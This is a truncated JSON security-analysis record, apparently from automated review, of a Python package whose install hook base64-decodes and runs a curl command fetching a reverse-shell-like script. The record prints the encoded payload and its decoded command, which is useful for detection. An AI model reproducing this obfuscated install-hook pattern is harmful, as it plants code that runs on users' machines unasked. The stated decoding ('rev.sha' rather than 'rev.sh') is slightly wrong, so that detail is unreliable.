{
  "purpose": "The code is designed to set up a Python package with custom installation commands that execute additional actions during installation or development setup.",
  "sources": "The base64-encoded string within the notmalfunc() function, which is decoded and executed via os.system.",
  "sinks": "os.system call executing a URL (http://localhost/rev.sha) after decoding the base64 string.",
  "flows": "The decoded base64 string is executed as a system command, leading to an HTTP request.",
  "anomalies": "The presence of base64 encoding for a URL that is fetched via system call, which is a common obfuscation technique. The URL suggests potential malicious activity, as it might be used to contact a remote server or exfiltrate data.",
  "analysis": "The script imports setup tools and overrides install and develop commands to execute custom functions. The function notmalfunc() decodes a base64 string ('Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaAo=') which decodes to 'curl http://localhost/rev.sha'. The function then runs this command via os.system. This action is triggered during the installation process (in AfterInstall). The URL 'http://localhost/rev.sha' is suspicious, as it suggests an attempt to contact a remote server (if not for localhost). The usage of base64 encoding hints at obfuscation to hide malicious intent, such as downloading or executing remote code or triggering network communication to a potentially malicious endpoint.",
  "conclusion": "The code includes a disguised command that, when executed, contacts a remote URL, potentially for malicious purposes such as data exfiltration or remote code execution. The obfuscation via base64 and execution during package installation indicates malicious intent or at least suspicious behavior. The overall risk score is high, considering the potential for malicious activity.",
